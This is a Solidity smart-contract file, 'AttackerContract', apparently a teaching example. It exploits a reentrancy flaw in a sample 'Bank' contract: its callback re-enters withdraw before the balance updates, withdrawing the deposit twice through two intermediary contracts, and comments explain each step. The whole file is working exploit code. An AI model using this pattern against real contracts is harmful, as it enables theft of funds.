// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.7.0 <0.9.0;
import './SubContract.sol';

contract AttackerContract is SubContractCallback {
  Bank bank;
  uint256 state;
  SubContract s1;
  SubContract s2;

  function attack(Bank b, uint256 amount) public payable {
    state = 0;
    bank = b;
    // first deposit some ether
    bank.deposit{ value: amount }();
    // then withdraw it again. This will create a new Intermediary contract, which
    // holds the funds until we retrieve it. This will trigger the
    // registerIntermediary callback.
    bank.withdraw(bank.getBalance(address(this)));
    // finally withdraw all the funds from our Intermediarys
    s1.withdraw();
    s2.withdraw();
  }

  function registerSubContract(address payable what) public payable override {
    // called by the newly created Intermediary contracts
    if (state == 0) {
      // we do not want to loop the re-entrancy until we run out of gas,
      // so we stop after the second withdrawal
      state = 1;
      // we keep track of the Intermediary, because it holds our funds
      s1 = SubContract(what);
      // withdraw again - note that `bank.balances[this]` was not yet
      // updated.
      bank.withdraw(bank.getBalance(address(this)));
    } else if (state == 1) {
      state = 2;
      // this is the second Intermediary that holds funds for us
      s2 = SubContract(what);
    } else {
      // ignore everything else
    }
  }

  function withdrawAll() public {
    s1.withdraw();
    s2.withdraw();
  }

  receive() external payable {}
}
